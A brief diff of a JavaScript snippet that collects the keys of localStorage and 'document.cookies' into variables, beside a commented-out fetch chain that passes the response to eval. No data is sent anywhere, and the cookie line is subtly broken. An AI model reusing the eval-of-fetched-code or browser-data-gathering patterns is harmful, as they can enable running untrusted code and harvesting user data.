@@ -2,4 +2,5 @@
   //}).then((json) => {console.log(json);eval(json); // The json object is here
   //});
 
-console.log(JSON.stringify(Object.keys(localStorage)))
+locall =  JSON.stringify(Object.keys(localStorage))
+cookies = JSON.stringify(Object.keys(document.cookies))
